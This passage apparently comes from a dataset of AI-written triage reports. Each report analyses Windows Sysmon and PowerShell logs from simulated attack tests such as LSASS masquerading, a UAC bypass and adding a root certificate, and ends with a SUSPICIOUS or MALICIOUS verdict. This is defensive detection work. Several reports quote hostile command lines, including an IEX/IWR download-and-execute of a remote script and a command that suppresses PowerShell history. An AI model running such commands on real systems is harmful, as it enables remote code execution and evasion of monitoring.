2. **Administrative Privileges and Logon Events:**
   - There are multiple instances of Event ID `4672`, which indicate special privileges assigned to new logons. The privilege list includes sensitive privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege`, which are often linked to privilege escalation attempts.
   - Logon events (Event ID `4624`) repeatedly show successful logons of the `SYSTEM` user using the `Advapi` logon process. This logon type (type `5`) is a service logon, and while common in certain scenarios, the repeated nature should raise suspicion about potential service exploitation.

3. **Enumeration of User Accounts:**
   - There are multiple occurrences of Event ID `4798` showing enumeration of local users, such as `Administrator`, `admin_test`, `DefaultAccount`, `Guest`, and `lplui`. Such enumeration activity can be part of reconnaissance or preparation for privilege escalation.

4. **Use of Command-Line Utilities:**
   - The Sysmon log identifies the execution of command-line utilities such as `wevtutil.exe`, `whoami.exe`, and `hostname.exe`. These utilities, while benign in everyday use, are often leveraged during reconnaissance to gather system information and manipulate logs, which aligns with the presence of the `ClearLogs` command in the PowerShell activity.

### Assessment and Conclusion:

The combination of downloading and executing scripts from external sources, running with elevated privileges, enumerating user accounts, and the execution of tools frequently associated with log manipulation and reconnaissance culminate in significant indicators of potential compromise or malicious activity.

### Resolution: **MALICIOUS**
- The analyzed logs show clear signs of 100% malicious activities, primarily centered around suspicious PowerShell execution and potential privilege escalation activities.

### Guidance on How to Proceed:
1. **Immediate Isolation:** Isolate the affected host (`Server002`) from the network to prevent further spread or data exfiltration.
2. **Incident Response:** Initiate a formal incident response procedure to further investigate the extent of the intrusion, including memory forensics and deeper log analysis.
3. **Patch and Harden:** Ensure the system and all associated services are up to date with the latest security patches. Review and limit excessive privileges for user accounts.
4. **Network Monitoring:** Increase monitoring of network traffic for unusual activities or attempts to communicate with known malicious external sources.
5. **Review Access Logs:** Conduct a thorough review of user access logs to determine any unauthorized access attempts or anomalies in logon patterns. 
6. **Training and Awareness:** Increase user awareness regarding suspicious email links or downloads that can lead to script execution."
Masquerading as Windows LSASS process,"Upon inspection of the provided event logs, several patterns and activities stand out that warrant closer examination:

1. **Repeated Credential Access Attempts (Event ID 5379)**: Multiple instances where the system attempted to access credentials related to ""MicrosoftAccount:user=02txoixylodcstop"" with return code ""3221226021"" indicating a failure or denial in retrieving credentials. The constant and repetitive nature of these attempts, especially with a non-typical account name such as ""02txoixylodcstop,"" needs further investigation. This could potentially signify either a misconfiguration or an attempt to access credentials improperly.

2. **Suspicious Command Execution (Sysmon Log Event ID 1)**: A particular observation of concern is the execution of ""cmd.exe"" with a command-line copying ""lsass.exe"" to the Temp directory. The legitimate ""lsass.exe"" is a crucial Windows process and is not typically executed from the Temp directory. The command appears to manipulate and execute another instance of a critical system file from a non-standard location, which is a common technique employed by attackers to dump or tamper with credentials.

3. **Execution of Elevated Commands (Event ID 4672)**: There are logs showing privilege escalation with a list of sensitive privileges assigned (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). While it is executed by a SYSTEM process, it demands assurance that these activities were expected and orchestrated through legitimate means, as misuse of such privileges can lead to system compromise.

4. **PowerShell Activities**: There are multiple entries indicating PowerShell use with restricted execution policies and commands likely designed to check or manipulate system states. Given PowerShell's capability and frequent usage in malicious scenarios, this activity should be verified against expected administrative operations.

Overall, the logging evidences potential misuse and anomalous behavior concerning:

- Continuous retrieval attempts of credentials which could imply brute-force or misconfiguration.
- Likely malicious command invocation executing unauthorized copying of critical system files.
- Operation of scripts or binaries using elevated privileges.

### Resolution:
Based on the analysis, the activity should be classified as **MALICIOUS**. The risk factors include potentially unauthorized credential access attempts and the suspicious manipulation of system processes, likely aiming at compromising system integrity and security.

### Guidance:
- Immediately conduct deeper network and endpoint forensic analysis to identify the initial point of compromise, propagation tactics, and potential data exfiltration.
- Isolate the affected host (Server002) from the network to prevent further spread or damage.
- Reset credentials and assess any changes made by compromised accounts.
- Verify system configurations and permissions to prevent unauthorized privileges and execution of non-standard programs.
- Review and enhance monitoring and alerts around systems and critical accounts to detect similar activities in the future. 

It's highly recommended to work with incident response teams to address any root causes, patch vulnerabilities, and fortify ongoing defense mechanisms."
Set Custom AddToHistoryHandler to Avoid History File Logging,"**Detailed Analysis of the Logs**

### Events Overview

The provided logs consist of various Sysmon, Windows PowerShell, and Application log entries from a Windows host. Here’s the analysis of significant entries:

1. **Sysmon Events:**
   - The logs show multiple executions of Windows built-in utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe` by an administrative user (`SERVER002\\admin_test`). These utilities in isolation are generally benign and are often used for administrative tasks. However, executing certain utilities such as `wevtutil.exe` can be leveraged in attacks to clear logs or export logs as part of persistence or data exfiltration tactics.
   - There are frequent launches of `conhost.exe`, which is typical as it acts as an interface to allow console interactions for executables like `wevtutil.exe` and `hostname.exe`.
   - The execution of `powershell.exe` with the command `Set-PSReadLineOption -AddToHistoryHandler { return $false }` is noteworthy. This command modifies PowerShell behavior to not log the command history, which is often used to evade detection. This could suggest an attempt to execute commands without leaving traces.

2. **Windows PowerShell Logs:**
   - PowerShell logs show the initialization of various providers, consistent with a PowerShell session. These logs align with Sysmon logs, which show the execution of a PowerShell process with an option that disables command history logging.

3. **Application and Security Logs:**
   - Application logs show normal software protection and service activities without any explicit errors or warnings. The Edge Update service logs suggest typical update checks and installations.
   - Security logs are absent; however, System and Application logs have routine entries.

### Indicators of Suspicious or Malicious Activity

- **PowerShell Command Execution:** The command `Set-PSReadLineOption -AddToHistoryHandler { return $false }` is concerning as it can be indicative of an attempt to conceal actions taken in a PowerShell session. This is a common technique to evade detection by preventing command history from being saved.
- **Usage of Administrative Tools:** Although the tools themselves (`wevtutil`, `whoami`, etc.) are not harmful, the context and timing of their execution could indicate potential abuse if the underlying intent is to manipulate logs or verify compromised access.

### Threat Assessment and Risks

While many of the actions logged can be typical for administrative activities, the specific use of PowerShell to suppress history logging elevates the risk context. This action could indicate an attempt to conduct operations stealthily, characteristic of malicious activity.

### Resolution and Recommendations

**Resolution: SUSPICIOUS**

- **Further Investigation Required:** The use of PowerShell to suppress history logging requires further investigation to rule out malicious intent. Review any corresponding context around these events, such as what users executed subsequent to these changes in the system.
- **Monitor User Activity:** Enhance monitoring of `SERVER002\admin_test` actions to quickly detect any potentially unauthorized or malicious activities.
- **Audit PowerShell Scripts:** Conduct an audit of scripts and commands run around this timeframe to check for any unauthorized or suspicious scripts.
- **Security Improvements:** Implement security controls to mitigate powershell abuse, such as enabling detailed PowerShell logging and using tools like Windows Defender Advanced Threat Protection (ATP) for deeper insights into script-based attacks.

The situation necessitates increased vigilance and may warrant escalation based on further findings."
Disable Windows LogOff Button,"Upon analyzing the provided Sysmon logs, several points of interest arise that could indicate potentially suspicious activity on the system. Below is a detailed breakdown of the findings:

### Observations:

1. **Frequent Usage of `wevtutil.exe` and `conhost.exe`**:
   - There are numerous entries involving `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` by the user `SERVER002\admin_test`.
   - `wevtutil.exe` is used to manipulate Windows event logs, which in itself is not inherently malicious but could be abused for log tampering to cover tracks of malicious actions.
   - The frequent spawning of `conhost.exe`, which hosts console windows, accompanying `wevtutil.exe` operations could indicate script or batch file execution.

2. **Registry Modification Using `cmd.exe`**:
   - The command `""cmd.exe"" /c reg add ...` executed by the user `SERVER002\admin_test` to modify registry values related to `NoLogOff` and `StartMenuLogOff`. 
   - Modifying registry policies under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer` without clear justification could indicate an attempt to enforce user restrictions or evade capturing user session logout, which is common in malware persistence/anti-forensic techniques.

3. **Execution of Diagnostic Tools (`whoami.exe`, `hostname.exe`)**:
   - Execution of tools like `whoami.exe` and `hostname.exe` is generally benign and often used for diagnostics or scripting. However, without context, it could also be part of a larger script for gathering environment data or confirming operational context in a malicious routine.

4. **Launching and Interaction with `Microsoft Edge Update`**:
   - Logs show activity related to `MicrosoftEdgeUpdate.exe` which usually reflects automatic software updates. This is a benign process but ensuring its hashes and launch context is legitimate is advisable as adversaries sometimes leverage legitimate update processes.

5. **Suspicious Timing**:
   - All events occur within a very narrow timeframe (seconds apart), suggesting automated or scripted activity. While automation is common in system management, it requires context verification especially when sensitive changes occur.

### Assessment:

Based on the above points, the activity observed in the event logs suggests potential usage of Windows utilities for either legitimate system management or possible obfuscation attempts. The specific use of `wevtutil.exe` and registry modifications by an administrative account require further context to adjudicate.

### Conclusion:

- **Resolution: SUSPICIOUS**
  - While the processes and command-line activities are not categorically malicious based on these logs alone, the combination of registry modifications, event log interactions, and timing hint at potential misuse, warranting deeper investigation.

### Recommendations:

1. **Review User Activity**:
   - Investigate the account `SERVER002\admin_test` for contextual purposes. Validate the legitimacy of the user's actions during this timeframe.

2. **Check Configuration and Policies**:
   - Confirm if registry changes were authorized and intended. If not, immediately revert and investigate further.

3. **Evaluate Automated Scripts**:
   - Determine if any scripts or third-party software might have triggered the sequence of events and review security implications.

4. **Conduct Host Forensics**:
   - Analyze further for any additional signs of compromise. Include review of system startup entries, scheduled tasks, and any other unusual log entries not covered here.

5. **Audit Change Management Process**:
   - Ensure any updates or changes follow a secure and documented change management process to avoid unauthorized modifications."
Extract binary files via VBA,"Upon reviewing the provided Windows event logs, several suspicious activities that require attention were identified. Let me elaborate on the analysis of the logs:

### Analysis

1. **PowerShell Activities:**
   - PowerShell commands executed on `Server002` are highly suspicious. The command reads a file `""data-macrocode.txt""` from a temporary location, modifies its content, and executes a script downloaded from an external source (`https://raw.githubusercontent.com/...`). This pattern is commonly associated with malicious activities such as downloading additional malware or scripts for further exploitation.
   - The use of `Invoke-Expression` (IEX) in PowerShell with content from an external URL is a red flag. It's a typical method used by attackers to execute remote scripts without saving them to disk, making it harder to detect.

2. **Sysmon Logs:**
   - The frequent execution of `wevtutil.exe` and `conhost.exe`, along with the PowerShell activity, suggests possible manipulation or querying of event logs (`wevtutil.exe`). This can indicate attempts at clearing or tampering with logs to erase traces of malicious actions.
   - The launching of `HOSTNAME.EXE` and `whoami.exe` right after PowerShell execution might be an attempt to gather information about the host and the currently logged-in user. This behavior aligns with reconnaissance actions taken during a cyber attack.

3. **User Activity:**
   - The user `SERVER002\admin_test` performed all these actions, indicating that the admin user account might be compromised.
   - All processes executed under a high integrity level suggest escalated privileges, which is unusual for standard operations.

4. **External Script Execution:**
   - The script being fetched from `https://raw.githubusercontent.com/...` requires verification. Ensure the URL and its content are legitimate and authorized by your organization. Unauthorized scripts executed from this location might indicate a compromise.

### Conclusion

Considering the evidence of unauthorized PowerShell commands, external script execution, consistent use of high integrity processes, and possible log tampering, the activities are deemed **MALICIOUS**.

### Recommendations

1. **Immediate Isolation:**
   - Disconnect `Server002` from the network to prevent further potential damage or exfiltration of data.

2. **User Account Review:**
   - Investigate the `admin_test` account for suspicious activities and modify credentials immediately. Consider implementing multi-factor authentication (MFA).

3. **Forensic Analysis:**
   - Conduct a thorough forensic analysis to determine the extent of the breach and identify any additional compromised systems.

4. **Network Monitoring:**
   - Enhance monitoring of network traffic for unusual outbound connections that may indicate data exfiltration.
   
5. **PowerShell Logging:**
   - Enable enhanced PowerShell logging if not already in place to better track script execution activities in the future.

Initiate an incident response protocol in accordance with the organization's policies to mitigate and recover from the detected malicious activities."
Bypass UAC using SilentCleanup task,"Based on the detailed analysis of the provided Windows event logs, I have identified several activities worth noting:

1. **Repetitive `wevtutil.exe` and `conhost.exe` Execution (Events 17960, 17961, 17964, 17965, etc.):**
   - `wevtutil.exe` is a tool used for managing event logs on a Windows machine. Consistent execution within a short timeframe by a user (`SERVER002\\admin_test`) could be intended to clear logs or to export them. Given the user appears with high integrity, this could imply an intentional activity, possibly to cover tracks.
   - `conhost.exe` is the Console Windows Host. The pattern of alternating between `wevtutil.exe` and `conhost.exe` rapidly is not typical for regular operations and might suggest some script executing these in tandem.

2. **Execution of `cmd.exe` With a Suspicious Command (EventID 17987):**
   - An instance of `cmd.exe` executed with the command-line argument `\""cmd.exe\"" /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\src\\data.002.bat\""`. Execution from a Temp directory is common for malicious activities and should be further examined, especially given the lack of context or origin of `data.002.bat`.

3. **`wsmprovhost.exe` as a Parent Process:**
   - Several processes (`hostname.exe`, `whoami.exe`) have `wsmprovhost.exe` as their parent process. `wsmprovhost.exe` is a host process for Windows Remote Management (WinRM). The integrity level is high, indicating administrative context, yet the processes are quite basic and potentially exploratory or obscuring actions.
   
4. **Multiple Microsoft Edge Update Executions:**
   - There are frequent executions involving Microsoft Edge Update tasks. While some of these could be legitimate patch updates, they deserve a look to confirm no tampering or shadow installation is conducted via these processes, especially since several processes initiate with a `/update` or `/regserver` flag.

5. **General Observation:**
   - The logs indicate high-integrity processes being run back-to-back within a very short period. This is often indicative of a script or automated task. Although no explicitly malicious indicators such as remote IP connections or well-known malware patterns are recorded, the behavior warrants a deeper inspection.

**Assessment & Resolution:**
- **Resolution:** **SUSPICIOUS**
  - **Reason:** The repetitive execution of system utilities (`wevtutil.exe`, `conhost.exe`) using a high-integrity administrative context, alongside `cmd.exe` running a potentially unknown script from a temporary file location, suggests a pattern that is not common for regular administrative activities. Also, the repetitive Edge update processes in varied paths merit confirmation of their legitimacy.
  
**Guidance on How to Proceed:**
1. **Review User Actions:**
   - Verify whether user `admin_test` has a legitimate reason for these actions, such as authorized maintenance or log review tasks.
2. **Investigate the Script:**
   - Locate and investigate the content of the `data.002.bat` script to determine its purpose and legitimacy.
3. **Check for Persistence Mechanisms:**
   - Review scheduled tasks, startup folders, and registry entries to ensure no malicious persistence mechanisms are established.
4. **Network and System Monitoring:**
   - Enhance monitoring of outbound connections and internal communications for any unusual activities.
5. **System Updates:**
   - Review patch management logs to verify if the Edge Updates correspond to genuine deployments.

By focusing on these actions, you can mitigate risks and potentially uncover any latent threats."
Invoke HTML Application - Simulate Lateral Movement over UNC Path,"Upon thorough analysis of the provided Windows event logs, I have identified several indicators that suggest suspicious activity potentially indicative of malicious conduct. Here are the critical points from the logs:

1. **PowerShell Execution with Suspicious Activity**:
   - The PowerShell logs show the execution of a command involving `Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe`. The use of `mshta.exe` with PowerShell scripts can be suspicious, as it is often leveraged in script-based attacks to execute malicious HTML Applications (HTAs).
   - The `HostApplication` field in multiple log entries consistently shows PowerShell executing with a suspicious command structure, which involves invoking a potentially custom or obfuscated function or script.

2. **Sysmon Logs Indicating Uncommon Process Relationships**:
   - Sysmon logs reveal PowerShell executions from `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` by the user `SERVER002\\admin_test`. This execution context can be an indicator of initial compromise or further lateral movement attempts.
   - We also see processes like `wevtutil.exe` being executed, which could potentially be used to tamper with event logs. The command line `\""C:\\Windows\\system32\\wevtutil.exe\"" epl...` suggests exporting event logs, possibly for exfiltration or anti-forensics.

3. **Privileged Process Executions**:
   - Processes like `svchost.exe` and `conhost.exe` are performing operations in conjunction with these actions, although use of `conhost.exe` is typical in legitimate scenarios, the frequency of its appearance alongside other suspicious activities might merit further investigation.

### Assessment:
- **Suspicious Activity**: There is a consistent pattern of PowerShell usage with parameters scripted in a way often associated with obfuscated or leveraged activity. The presence of `mshta.exe` in the context presented, potential log tampering operations, and command executions that reflect common attack vectors indicate a potential compromise attempt or exploration activities within the network environment.
  
### Resolution:
- **Resolution**: SUSPICIOUS

### Recommended Actions:
1. **Immediate Investigation**: Conduct a deeper investigation into the purpose and source of the `Invoke-ATHHTMLApplication` and its modules. This could involve identifying whether this is part of an internal tool or external code of compromised origin.
2. **Containment**: Consider containment actions for the affected systems to limit any potential breach impact.
3. **Enhanced Monitoring**: Increase monitoring on `MSHTA.EXE`, `PowerShell`, and similar processes' activity across the network.
4. **Review Security Policies**: Ensure that security policies related to script execution, log auditing, and user privileges are up-to-date and check the integrity of the historical logs.
5. **Check for Related Files**: Investigate any HTA, script files, or related binary files that may have been downloaded or generated due to these activities, and analyze them for malicious scripts.

It would be prudent to escalate this analysis to a comprehensive incident response to better understand the scope and intention of the observed activities."
Execution of HTA and VBS Files using Rundll32 and URL.dll,"Upon reviewing the provided event logs, several items deserve further scrutiny due to their potential indication of suspicious or malicious behavior. Here is a detailed analysis:

### Detailed Analysis:

1. **Security Log:**
   - The Security log contains two events with EventID 4616. This event ID indicates a system time change. However, the time changes are minimal (less than a second) and involve the process ""svchost.exe."" Generally, svchost.exe is a legitimate process, but modifications of the system time could be exploited if occurring frequently or unexpectedly.

2. **System Log:**
   - Several logs indicate system time synchronization and updates from legitimate Windows components such as Windows Time-Service and Kernel-General logs. These appear normal as they indicate proper system time adjustment with an NTP server, `time.windows.com`.

3. **Sysmon Log:**
   - Sysmon event logs present a series of process creations executed by the user ""SERVER002\\admin_test"":
     - **`wevtutil.exe` executions:** Wevtutil is a command-line utility that can be used to query event logs, and frequent executions in a brief period could imply log tampering, but here it seems also to involve conhost.exe, indicating attempts to possibly obfuscate command prompt activity.
     - **Command Line involving `cmd.exe` and `rundll32.exe`:** The command line `""cmd.exe"" /c rundll32.exe url.dll,OpenURL ...` suggests the execution of URLs or scripts from a temporary directory. This command can be suspicious since `rundll32.exe` is often used in attacks to execute arbitrary code, in this context opening a script or HTA files, which may lead to malicious activities.

4. **Application Log:**
   - The logs here reflect typical application activity and updates. One event shows Windows Defender is active which is a positive security measure.

### Assessment and Conclusion:

- **Suspicious Indicators:**
  - **Frequent Executions of `wevtutil.exe` and `conhost.exe`:** Though not inherently malicious, they could signify attempts to tamper with or read event logs for cleanup post-compromise.
  - **Command Line Execution Involving `rundll32.exe`:** Running scripts from a temporary directory through `rundll32.exe` suggests potential malicious intent, such as executing or opening harmful files/scripts from a non-standard location.
  
- **Benign Indicators:**
  - **NTP and Kernel General Time Adjustment Log Entries:** Appear normal after scrutinizing.
  - **Active Windows Defender:** Active security monitoring is in place.

Given the analysis, the logs contain several events that warrant further investigation due to potentially suspicious command executions involving `rundll32.exe`. Although these are not conclusive by themselves as malicious, the command lines executed imply a risk of compromise.

### Recommended Resolution:

**SUSPICIOUS**: The observed logs showcase activities that, while not overtly malicious, contain behaviors that can potentially indicate nefarious intent. It's advised to conduct further investigation into the source and context of these command executions, especially around `rundll32.exe` and `cmd.exe`, and ensure endpoint protections are thoroughly reviewed and updated."
LOLBAS CustomShellHost to Spawn Process,"Upon reviewing the provided Sysmon, Security, System, and PowerShell event logs, the following findings and analysis are provided:

1. **Repeated Use of 'wevtutil.exe' and 'conhost.exe':**  
   The Sysmon logs report multiple instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` being executed in close succession by the same user `SERVER002\admin_test`. While the usage of these utilities can be legitimate, the frequency and rapid succession of these executions (especially `wevtutil.exe`) are unusual and could indicate scripts or automated processes manipulating event logs, potentially to cover malicious activity tracks.

2. **Persistence with PowerShell Script:**
   In the Sysmon and PowerShell logs, there is a PowerShell script invoking commands to:
   - Create a directory at `C:\test`.
   - Copy `customshellhost.exe` from `C:\windows\system32\` to `C:\test`.
   - Rename `calc.exe` to `explorer.exe` in `C:\test`.
   - Execute `customshellhost.exe` from `C:\test`.

   The use of PowerShell to execute a potentially custom executable (`customshellhost.exe`) and to manipulate executables like `calc.exe` into `explorer.exe` is not standard behavior and suggests an attempt at payload execution or privilege escalation.

3. **Execution of 'whoami.exe' and 'hostname.exe':**  
   The Sysmon log shows the execution of `whoami.exe` and `hostname.exe`, which can be normal for administrative purposes, but in conjunction given the context (especially with other actions like custom executable execution), may indicate reconnaissance or verification of security context by an attacker post-compromise.

4. **Time Change Event:**
   The system and security logs do indeed record a series of time change events. These are created by a legitimate time-sync process `svchost.exe` and are not necessarily indicators of suspicious behavior within the given context. However, legwork should always be done to verify these align with legitimate time synchronization scheduled tasks or service operations.

### Assessment:
Considering the suspicious usage of PowerShell, modifications to system utilities, and rapid-fire execution of system processes likely linked to log manipulation, this activity strongly indicates potential malicious behavior rather than benign administrative functions. 

### Resolution:
- **MALICIOUS**: The collection of logs strongly suggests attempts at executing potentially harmful scripts and processes, likely aimed at obfuscating actions and executing unauthorized and potentially malicious activities on the host. Immediate security measures, additional in-depth investigation, and possible isolation of the machine are recommended to prevent further potential compromise.

### Guidance:
- **Investigate 'customshellhost.exe'**: Check for hashing, digital signature, and assess the purpose of this executable.
- **Analyze scripts and automation**: Examine scheduled tasks or any persistent scripts in use on the system.
- **Review user activity**: Further scrutiny of activities under the `SERVER002\admin_test` user account.
- **Verify time change and sync logs**: Ensure these correlate with expected time synchronization operations or known configuration changes.
- **Initiate a comprehensive threat response protocol**: Considering potential unauthorized access or compromise."
InfDefaultInstall.exe .inf Execution,"### Detailed Log Analysis:

#### Application Log:
1. **EdgeUpdate Service Stopping:**
   Two consecutive events where the ""edgeupdate"" service stopped. While it's not abnormal for a service to stop, frequent stopping and starting actions within a short timeframe could be indicative of issues or tampering.
   
2. **Software Protection Platform Service:**
   The ""Software Protection Platform Service"" events appear routine with no detailed error or anomalous behavior logged.

#### Sysmon Log:
1. **EdgeUpdate Installation:**
   The initiation of the Microsoft Edge Update installer from a standard directory using a standard command line parameter ""/update /sessionid"" does not seem suspicious.

2. **PowerShell Execution:**
   Multiple PowerShell executions by the user ""SERVER002\\admin_test"" could be a point of interest as scripting attacks often abuse PowerShell. However, without specific command-line arguments shown, this execution alone lacks context for marking it as malicious.

3. **Conhost and Wevtutil Executions:**
   Frequent execution of `conhost.exe` and `wevtutil.exe` by ""addmin_test"" is unusual if aligned closely in time, suggesting they might be used for command-line operations or event log manipulation. However, the individual command lines and context were not provided.

4. **Hostname and Whoami Executions:**
   Routine commands like `hostname` and `whoami` are listed with high integrity level execution, which is typical in administrative operations. 

5. **CMD and INF Installation:**
   A command executed `InfDefaultInstall.exe` with an associated `.inf` file indicates installation procedures. Combined with the user ""admin_test,"" it suggests potentially administrative activities or configuration changes.

6. **MicrosoftEdgeUpdate Executions:**
   Multiple instances of EdgeUpdate processes such as the `MicrosoftEdgeUpdateComRegisterShell64.exe` are noted. These also appear standard within their context and paths.

#### Security Log:
1. **Logon and Privilege Use:**
   Logons associated with system user accounts like ""SYSTEM"" using typical processes indicate expected server behavior during system startups or service management.

#### Suspicious Activity Observations:
- **PowerShell and CMD Execution:**
  The user ""SERVER002\\admin_test"" initiating multiple PowerShell and command prompt sessions could suggest an anomalous activity, given the context. 
- **INF File Execution:**
  An unusual point could be the execution of `InfDefaultInstall.exe` from a user profile's Temp directory which warrants a deeper dive to ensure no system configurations were changed without authorization.
  
- **Repeated Conhost/Wevtutil Usage:**
  Repeated invocations of `conhost.exe` and `wevtutil.exe` by ""admin_test"" raise suspicion of possible log exploration or modification.

### Assessment and Guidance:
Based on the collected evidence and context from given logs:

- **Resolution: SUSPICIOUS**

Given the unexplained frequent use of administrative and system modification utilities (inf installer Execution and PowerShell/Conhost/Wevtutil Activities), further investigation is advised. Focus on:
- Reviewing exact `PowerShell` command lines executed.
- Auditing recent `.inf` modifications/installs.
- Checking user activities and rationalizing their tasks during these times and any unauthorized activities.
  
### Recommended Next Steps:
1. **Deep Dive into User ""admin_test"" Activities:**
   - Validate user access and review recent file and script changes.
2. **Examine InfDefaultInstall Usage:**
   - Validate the legitimacy of the `.inf` install path and operation purpose.
3. **Correlation Assessment:**
   - Correlate these logs with network activities to understand external communications or tool usage during the timeline.
4. **System Integrity Checks:**
   - Run integrity checks on critical systems files and ensure security policies are intact.

Following these steps will aid in concluding whether the suspicious activities were benign administrative tasks or genuinely malicious intent."
Snake Malware Registry Blob,"### Detailed Analysis of Logs

**Application log:**
- The Software Protection Platform Service entry and the edgeupdate service stopping do not appear suspicious. These are regular system service operations.

**Windows PowerShell log:**
- The PowerShell events demonstrate execution with command lines that involve changing registry properties using random byte values. Such activity is unusual and can often be seen in malicious scripts trying to obfuscate payloads or modify the system registry in a non-typical manner. The use of `$randomBytes` and setting a registry property named ""fileSnake"" with a binary type is highly irregular for standard operations.

**Security log:**
- The logs show normal activity related to time changes. This is usually expected and not indicative of suspicious activity by itself.

**Sysmon log:**
- The Sysmon log presents frequent use of `whoami.exe`, `conhost.exe`, and `powershell.exe`. The key concern is the PowerShell script leveraged with similar suspicious command lines witnessed in PowerShell logs. The `whoami.exe` and accompanying processes (`conhost.exe`, `wevtutil.exe`) generally indicate user inquiries and event log interactions which can be benign but are often used in adversary investigations or persistence, depending on context.
- The process involving `MicrosoftEdgeUpdate.exe` seems consistent with service updates and is benign in itself if no credential anomalies or execution abnormality accompanies it.

**System log:**
- Regular kernel and time service activities are observed here, with no overt signs of discrepancy.

### Assessment

The PowerShell activity is anomalous and suspicious due to:
- Registry modification with unexplained randomness (using `$randomBytes`).
- The naming of the registry key (e.g., ""fileSnake"") which is not a standard Windows registry entry and may indicate encoding or obfuscation attempts often associated with malicious scenarios.

### Resolution

**Resolution: SUSPICIOUS**

Given the PowerShell log entries’ nature and the attempts to manipulate registry entries using non-standard patterns, this behavior stands out and warrants **further investigation**. It is unlikely, without more context and corroborative activity, to immediately describe as 'MALICIOUS'. However, it does not align with typical system operations and presents a potential risk.

### Guidance on How to Proceed

1. **Conduct a forensic analysis**: Dive deeper into those PowerShell scripts to understand their full scope and intent.
   
2. **Review related access logs**: Determine if the PowerShell session was initiated willingly and by authorized users. Cross-check user activities around the time of these logs.

3. **Check registry settings**: Rollback or audit any registry changes to understand what was altered, maintaining a clean state.

4. **Monitor further activity**: Ensure that future PowerShell commands and potentially harmful scripts are logged with increased scrutiny.

5. **Engage with IT support**: Validate whether this activity could have been part of an approved automation or update task by the IT department as part of internal processes."
Regsvr32 Silent DLL Install Call DllRegisterServer,"Upon reviewing the provided logs, I have focused on identifying any suspicious activity related to process executions, command line usage, and signs of common malicious patterns. Here's a detailed analysis of the provided logs:

### Observations:

1. **Windows Defender Status**:
   - The application logs show a consistent state for Windows Defender (`SECURITY_PRODUCT_STATE_ON`), which indicates that the security product is active and functioning as expected. This is a positive sign, as it implies that real-time protection was enabled on the host.

2. **Sysmon Logs Analysis**:
   - **PowerShell Execution**: PowerShell is executed several times on user `SERVER002\admin_test`. While PowerShell is commonly used for legitimate administrative tasks, it is also frequently targeted by attackers for malicious purposes. However, the logs do not provide the specific command line arguments used with PowerShell, thereby reducing immediate suspicion without further context.
   
   - **Execution of `wevtutil.exe` and `conhost.exe`**: The repeated execution of `wevtutil.exe` (event utility tool) suggests potential log manipulation or querying. The presence of `conhost.exe` is related to console applications, and frequently accompanies command line operations. Such activities might be administrative, but a high frequency and the sequence might warrant further investigation.
   
   - **`hostname.exe` and `whoami.exe` Commands**: Seen executed by the same user, these tools query the system for identifying information. While benign in isolation, frequent use in quick succession might suggest reconnaissance activities on the system.
   
   - **Suspicious `cmd.exe` and `regsvr32.exe`**: 
     - Execution of `cmd.exe` with a command line indicating the registration of a DLL (`AllTheThingsx86.dll`) using `regsvr32.exe` is suspicious. The use of `regsvr32.exe` for DLL registration can be legitimate; however, it is also known to be abused for executing malicious scripts without triggering certain security alerts. The context of installing `AllTheThingsx86.dll` from a temporary directory adds further suspicion to this action, suggesting potential execution of a malicious payload.

3. **Process Integrity Levels**:
   - Several processes run at a ""High"" integrity level, indicating potential admin-level execution which is commonly required for system-level changes (or exploitation attempts).

### Assessment and Resolution:

- **Assessment**:
  - **Suspicious Activity Detected**: The execution of `cmd.exe` with `regsvr32.exe` registering a suspicious DLL from a temporary directory stands out as a possible indicator of compromise. The clustering of events along with administrative actions like using `whoami.exe` and `hostname.exe` adds to potential concerns of pre-attack reconnaissance or lateral movement attempts.

- **Resolution**: **SUSPICIOUS**
  - The logs contain activity that raises concerns due to potentially unusual process executions and command line usage. Particularly, the use of `cmd.exe` with `regsvr32.exe` could relate to known malicious techniques. It is essential to verify the legitimacy of these actions with more data (such as network activity, specific command line arguments, hash reputation checks, and user intent).

### Guidance on How to Proceed:

1. **Investigate User `admin_test`**: Conduct an interview or review access logs for the user `SERVER002\admin_test` to determine if they performed these actions intentionally for administrative purposes.

2. **Review the DLL**: Verify the `AllTheThingsx86.dll` for legitimacy. Perform a hash check or submission to a malware analysis platform if necessary.

3. **Network and Firewall Logs**: Look for unusual outbound connections or failed logins around the same time as these events for potential lateral movement or data exfiltration.

4. **Expand Log Scope**: If available, check for additional logs such as Windows PowerShell logging, security logs for modifications, and any alerts from an Endpoint Detection and Response (EDR) system for further insights on process activities.

Following these steps should help determine if the activity is indeed malicious or if it's simply an anomaly with legitimate explanation."
Add Root Certificate to CurrentUser Certificate Store,"Based on the provided Windows event logs, here is a detailed analysis and assessment of any suspicious or anomalous behavior:

### Windows PowerShell Log:
The logs indicate multiple instances of PowerShell being executed with the following command: 
`powershell.exe & {IEX (IWR 'https://github.com/file/file-file/raw/master/files/data.004/src/RemoteCertTrust.ps1' -UseBasicParsing)}`
- **Analysis**: 
  - This invocation of PowerShell is attempting to download and execute a script directly from an external GitHub URL using `Invoke-Expression` (IEX) and `Invoke-WebRequest` (IWR), which is often associated with malicious activity, especially when it is not common behavior for the system or user.
  - The execution of scripts from external sources using `IEX` is particularly concerning because it allows code execution without downloading the file locally, masking potential suspicious behavior.
  
### Sysmon Log:
- **Processes of Interest**:
  - `powershell.exe` running with a command line that matches the above script execution.
  - Processes like `wevtutil.exe` and `conhost.exe` with the user `SERVER002\admin_test` at high integrity, which could suggest activities involving system logs or console interactions.
  
- **Edge Update Processes**:
  - Numerous automatic updates for Microsoft Edge Update processes, which generally appear benign, as they are running under `NT AUTHORITY\SYSTEM`. These updates can be verified against known version numbers and expected update schedules to assure they are legitimate.

### Indicators of Compromise:
1. **Malicious Use of PowerShell**: The use of PowerShell to execute remote scripts without supervision indicates possible compromise.
2. **Lack of Contextual Information**: The absence of the usual administrative tasks or benign reasoning behind the PowerShell usage raises suspicion.

### Conclusion:
